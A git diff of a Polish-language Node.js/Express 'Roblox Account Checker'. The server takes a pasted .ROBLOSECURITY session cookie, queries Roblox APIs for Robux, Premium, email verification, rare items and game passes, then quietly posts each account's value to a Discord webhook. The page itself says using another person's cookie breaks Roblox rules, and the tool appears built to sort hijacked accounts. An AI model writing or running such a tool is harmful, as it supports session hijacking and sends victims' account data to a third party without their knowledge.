@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 app.use(express.json());
 
-// CORS – żeby strona działała z dowolnego źródła
+// CORS
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -13,14 +13,14 @@ app.use((req, res, next) => {
   next();
 });
 
-// Strona główna
+// Strona główna (HTML bez większych zmian)
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="pl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Account Checker – .ROBLOSECURITY</title>
+  <title>Roblox Account Checker</title>
   <style>
     body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
     textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
@@ -32,13 +32,11 @@ app.get('/', (req, res) => {
   </style>
 </head>
 <body>
-<h2>Roblox Account Info (.ROBLOSECURITY)</h2>
-<p style="color:#ffcc00; font-weight:bold;">
-  <strong>UWAGA:</strong> Używanie cudzego cookie jest niezgodne z regulaminem Roblox i może skończyć się permanentnym banem konta.
-</p>
+<h2>Roblox Account Checker (.ROBLOSECURITY)</h2>
+<p style="color:#ffcc00; font-weight:bold;">UWAGA: używanie cudzego cookie = złamanie ToS Roblox → ban konta</p>
 <textarea id="cookie" placeholder="Wklej wartość .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
 <br>
-<button onclick="checkAccount()">Sprawdź konto</button>
+<button onclick="checkAccount()">Sprawdź</button>
 <div id="result"></div>
 
 <script>
@@ -46,72 +44,48 @@ async function checkAccount() {
   const cookieVal = document.getElementById('cookie').value.trim();
   const result = document.getElementById('result');
   result.innerHTML = '';
-  
   if (cookieVal.length < 200) {
-    result.innerHTML = '<span class="error">Cookie jest za krótki lub nieprawidłowy</span>';
+    result.innerHTML = '<span class="error">Cookie za krótki / nieprawidłowy</span>';
     return;
   }
-
-  result.innerHTML = '<i>Sprawdzam konto... proszę czekać</i>';
-
+  result.innerHTML = '<i>Sprawdzam...</i>';
   try {
     const resp = await fetch('/check', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie: cookieVal })
     });
-
     const json = await resp.json();
-
     if (json.error) {
       result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
       return;
     }
-
     if (json.success) {
       const creationDate = json.created !== 'failed'
         ? new Date(json.created).toLocaleDateString('pl-PL', { month: 'long', day: 'numeric', year: 'numeric' })
         : '—';
-
       let avatarHtml = json.avatarUrl
-        ? \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=Brak+Avatara';">\`
-        : '<p style="color:#ffcc00;">Nie udało się załadować avatara</p>';
-
-      const mm2Passes = [429957, 1308795];
-      let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
-      const mm2Color = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';
-
-      const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
-      let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
-      const ampColor = ampCount > 0 ? '#00ff9d' : '#ff4d4d';
-
-      const sabPasses = [1227013099, 1229510262, 1228591447];
-      let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
-      const sabColor = sabCount > 0 ? '#00ff9d' : '#ff4d4d';
-
+        ? \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar">\`
+        : '<p style="color:#ffcc00;">Brak avatara</p>';
       result.innerHTML = \`
-        <span class="success">Konto zweryfikowane pomyślnie!</span><br><br>
+        <span class="success">OK!</span><br><br>
         \${avatarHtml}
         <b>Nick:</b> \${json.username}<br>
-        <b>Display Name:</b> \${json.displayName}<br>
         <b>User ID:</b> \${json.userId}<br>
-        <b>Roblox Premium:</b> <span style="color: \${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}</span><br>
-        <b>Email / Telefon zweryfikowany:</b> <span style="color: \${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.emailVerified ? 'TAK ✓' : 'NIE ✗'}</span><br>
-        <b>Robux:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.robux.toLocaleString('pl-PL')} Robux</span><br>
-
-        <b>MM2 Gamepasy:</b> <span style="color: \${mm2Color}; font-weight: bold;">\${mm2Count}</span><br>
-        <b>AMP Gamepasy:</b> <span style="color: \${ampColor}; font-weight: bold;">\${ampCount}</span><br>
-        <b>SAB Gamepasy:</b> <span style="color: \${sabColor}; font-weight: bold;">\${sabCount}</span><br>
-
-        <b>Headless Horseman:</b> <span style="color: \${json.hasHeadless ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasHeadless ? 'TAK ✓' : 'NIE ✗'}</span><br>
-        <b>Korblox Deathspeaker:</b> <span style="color: \${json.hasKorblox ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasKorblox ? 'TAK ✓' : 'NIE ✗'}</span><br>
-
-        <b>Wiek konta:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.accountAgeDays} dni</span><br>
-        <b>Utworzone:</b> \${creationDate} \${json.created !== 'failed' ? \`<small>(\${json.created.split('T')[0]})\</small>\` : ''}<br>
+        <b>Premium:</b> \${json.hasPremium ? 'Tak' : 'Nie'}<br>
+        <b>Email zweryfikowany:</b> \${json.emailVerified ? 'Tak' : 'Nie'}<br>
+        <b>Robux:</b> \${json.robux.toLocaleString('pl-PL')}<br>
+        <b>Headless:</b> \${json.hasHeadless ? 'Tak' : 'Nie'}<br>
+        <b>Korblox:</b> \${json.hasKorblox ? 'Tak' : 'Nie'}<br>
+        <b>MM2:</b> \${json.mm2Count}<br>
+        <b>AMP:</b> \${json.ampCount}<br>
+        <b>SAB:</b> \${json.sabCount}<br>
+        <b>Wiek:</b> \${json.accountAgeDays} dni<br>
+        <b>Utworzono:</b> \${creationDate}<br>
       \`;
     }
   } catch (e) {
-    result.innerHTML = \`<span class="error">Błąd połączenia: \${e.message}</span>\`;
+    result.innerHTML = \`<span class="error">Błąd: \${e.message}</span>\`;
   }
 }
 </script>
@@ -119,15 +93,14 @@ async function checkAccount() {
 </html>`);
 });
 
-// Endpoint sprawdzający konto + wysyłka na webhook
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
-    return res.status(400).json({ error: 'Brak lub nieprawidłowy cookie' });
+    return res.status(400).json({ error: 'Brak / nieprawidłowy cookie' });
   }
 
   try {
-    // CSRF Token
+    // CSRF
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -136,72 +109,62 @@ app.post('/check', async (req, res) => {
       },
     });
     const csrfToken = tokenRes.headers.get('x-csrf-token');
-    if (!csrfToken) throw new Error('Nie udało się pobrać X-CSRF-Token – nieważny/expired cookie?');
+    if (!csrfToken) throw new Error('Brak X-CSRF-Token – cookie invalid/expired');
 
     // Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
-      method: 'GET',
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
         'X-CSRF-TOKEN': csrfToken,
         'Accept': 'application/json',
       },
     });
-    if (!userRes.ok) {
-      throw new Error(userRes.status === 401 ? 'Nieprawidłowy lub wygasły cookie' : `Błąd API: ${userRes.status}`);
-    }
+    if (!userRes.ok) throw new Error('Nieprawidłowy cookie');
     const userData = await userRes.json();
 
-    // Email/Telefon zweryfikowany (hat verified)
+    // Email verified (verified hat)
     let emailVerified = false;
     try {
-      const ownsRes = await fetch(
-        `https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`,
-        {
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'X-CSRF-TOKEN': csrfToken,
-            'Accept': 'application/json',
-          },
-        }
-      );
-      if (ownsRes.ok) {
-        const ownsData = await ownsRes.json();
-        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
+      const owns = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
+      });
+      if (owns.ok) {
+        const d = await owns.json();
+        emailVerified = d.data?.length > 0;
       }
     } catch {}
 
     // Premium
     let hasPremium = false;
     try {
-      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
+      const prem = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
-      if (premiumRes.ok) hasPremium = await premiumRes.json();
+      if (prem.ok) hasPremium = await prem.json();
     } catch {}
 
     // Robux
     let robux = 0;
     try {
-      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
+      const cur = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
-      if (currencyRes.ok) {
-        const data = await currencyRes.json();
-        robux = data.robux || 0;
+      if (cur.ok) {
+        const d = await cur.json();
+        robux = d.robux || 0;
       }
     } catch {}
 
-    // Wiek konta + data utworzenia
+    // Profil → created + age
     let accountAgeDays = 0;
-    let createdDate = null;
+    let created = null;
     try {
-      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
-      if (profileRes.ok) {
-        const profile = await profileRes.json();
-        if (profile.created) {
-          createdDate = profile.created;
-          accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
+      const prof = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
+      if (prof.ok) {
+        const p = await prof.json();
+        if (p.created) {
+          created = p.created;
+          accountAgeDays = Math.floor((Date.now() - new Date(created).getTime()) / 86400000);
         }
       }
     } catch {}
@@ -209,82 +172,62 @@ app.post('/check', async (req, res) => {
     // Avatar
     let avatarUrl = null;
     try {
-      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
-      if (thumbRes.ok) {
-        const thumbData = await thumbRes.json();
-        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
+      const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
+      if (thumb.ok) {
+        const t = await thumb.json();
+        avatarUrl = t.data?.[0]?.imageUrl;
       }
     } catch {}
 
-    // Gamepasy
+    // Gamepasses
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
-    const allIds = [...mm2Ids, ...ampIds, ...sabIds];
-    const hasGamePasses = [];
+    const allPasses = [...mm2Ids, ...ampIds, ...sabIds];
+    const ownedPasses = [];
 
-    try {
-      for (const passId of allIds) {
-        const gpRes = await fetch(
-          `https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`,
-          {
-            headers: {
-              'Cookie': `.ROBLOSECURITY=${cookie}`,
-              'X-CSRF-TOKEN': csrfToken,
-              'Accept': 'application/json',
-            },
-          }
-        );
-        if (gpRes.ok) {
-          const gpData = await gpRes.json();
-          if (Array.isArray(gpData.data) && gpData.data.length > 0) {
-            hasGamePasses.push(passId);
-          }
+    for (const id of allPasses) {
+      try {
+        const res = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${id}`, {
+          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
+        });
+        if (res.ok) {
+          const d = await res.json();
+          if (d.data?.length > 0) ownedPasses.push(id);
         }
+      } catch {}
+    }
+
+    const mm2Count = ownedPasses.filter(id => mm2Ids.includes(id)).length;
+    const ampCount = ownedPasses.filter(id => ampIds.includes(id)).length;
+    const sabCount = ownedPasses.filter(id => sabIds.includes(id)).length;
+
+    // Headless + Korblox (bundle ID jak chciałeś)
+    let hasHeadless = false;
+    let hasKorblox = false;
+    try {
+      const hRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
+      });
+      if (hRes.ok) {
+        const d = await hRes.json();
+        hasHeadless = d.data?.length > 0;
+      }
+
+      const kRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
+      });
+      if (kRes.ok) {
+        const d = await kRes.json();
+        hasKorblox = d.data?.length > 0;
       }
     } catch {}
 
-    // Headless i Korblox – sprawdzamy jako Bundle (według podanych przez Ciebie ID)
-    let hasHeadless = false;
-    let hasKorblox = false;
+    // ────────────────────────────────────────
+    //          WYNIK DO STRONY + WEBHOOK
+    // ────────────────────────────────────────
 
-    try {
-      // Headless Horseman – bundle 201
-      const headlessRes = await fetch(
-        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`,
-        {
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'X-CSRF-TOKEN': csrfToken,
-            'Accept': 'application/json',
-          },
-        }
-      );
-      if (headlessRes.ok) {
-        const data = await headlessRes.json();
-        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
-      }
-
-      // Korblox Deathspeaker – bundle 192
-      const korbloxRes = await fetch(
-        `https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`,
-        {
-          headers: {
-            'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'X-CSRF-TOKEN': csrfToken,
-            'Accept': 'application/json',
-          },
-        }
-      );
-      if (korbloxRes.ok) {
-        const data = await korbloxRes.json();
-        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
-      }
-    } catch (e) {
-      console.error('Błąd sprawdzania bundle Headless/Korblox:', e.message);
-    }
-
-    const result = {
+    const resultData = {
       success: true,
       username: userData.name,
       displayName: userData.displayName || userData.name,
@@ -292,66 +235,80 @@ app.post('/check', async (req, res) => {
       hasPremium,
       robux,
       accountAgeDays,
-      created: createdDate || 'failed',
+      created: created || 'failed',
       avatarUrl,
-      hasGamePasses,
       emailVerified,
       hasHeadless,
       hasKorblox,
+      mm2Count,
+      ampCount,
+      sabCount
     };
 
-    res.status(200).json(result);
+    res.json(resultData);
 
-    // Wysyłka do webhooka Discord
-    const webhookUrl = process.env.WEBHOOK;
-    if (webhookUrl) {
+    // ────────────── WEBHOOK DISCORD ──────────────
+    const webhook = process.env.WEBHOOK;
+    if (webhook) {
       try {
-        await fetch(webhookUrl, {
+        await fetch(webhook, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             embeds: [{
-              title: `${userData.name} ・ Roblox Info`,
-              color: 0x9B59B6,
+              color: 0x0F0F23,
+              title: `<:User:1481761037257674872> ${userData.name}`,
+              description: "**AVATAR**",
               thumbnail: {
                 url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
               },
               fields: [
-                { name: "Nick", value: userData.name, inline: true },
-                { name: "Premium", value: hasPremium ? "Tak" : "Nie", inline: true },
-                { name: "Email/Telefon", value: emailVerified ? "Tak" : "Nie", inline: true },
                 {
-                  name: "\u200B",
-                  value: `<:robux:1481759314426204230> ${robux.toLocaleString('en-US')}`,
+                  name: "┌─────── Account Stats ───────┐",
+                  value: `• Account Age: **${accountAgeDays} dni**\n• Game Developer: **nie**\n• Game Visits: **?—**\n• Group Owner: **?—**`,
+                  inline: false
+                },
+                {
+                  name: "┌────────── Info ──────────┐",
+                  value:
+                    `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
+                    `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'Tak' : 'Nie'}**\n` +
+                    `✉️ Email / Phone: **${emailVerified ? 'Tak' : 'Nie'}**`,
                   inline: true
                 },
-                { name: "Utworzone", value: createdDate ? createdDate.split('T')[0] : "?", inline: true },
-                { name: "Wiek konta", value: `${accountAgeDays} dni`, inline: true },
-                { name: "<:MM2:1481763122808230164> Gamepasy", value: hasGamePasses.filter(id => mm2Ids.includes(id)).length.toString(), inline: true },
-                { name: "<:AMP:1481763635775930520> Gamepasy", value: hasGamePasses.filter(id => ampIds.includes(id)).length.toString(), inline: true },
-                { name: "<:SAB:1481763931113394177> Gamepasy", value: hasGamePasses.filter(id => sabIds.includes(id)).length.toString(), inline: true },
-                { name: "Headless Horseman", value: hasHeadless ? "Tak ✓" : "Nie ✗", inline: true },
-                { name: "Korblox Deathspeaker", value: hasKorblox ? "Tak ✓" : "Nie ✗", inline: true },
+                {
+                  name: "┌──────── Games ──────────┐",
+                  value:
+                    `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
+                    `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
+                    `<:SAB:1481763931113394177> SAB: **${sabCount}**`,
+                  inline: true
+                },
+                {
+                  name: "┌─────── Inventory ───────┐",
+                  value:
+                    `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'Tak' : 'Nie'}**\n` +
+                    `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'Tak' : 'Nie'}**`,
+                  inline: true
+                }
               ],
               footer: {
-                text: "Checker • " + new Date().toLocaleString('pl-PL')
+                text: "24H! • " + new Date().toLocaleString('pl-PL')
               },
               timestamp: new Date().toISOString()
             }]
           })
         });
       } catch (e) {
-        console.error("Błąd wysyłania do webhooka:", e.message);
+        console.error("Webhook error:", e.message);
       }
     }
 
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: err.message || 'Błąd wewnętrzny serwera' });
+    res.status(500).json({ error: err.message || 'Błąd serwera' });
   }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Serwer uruchomiony na porcie ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Serwer na porcie ${PORT}`));
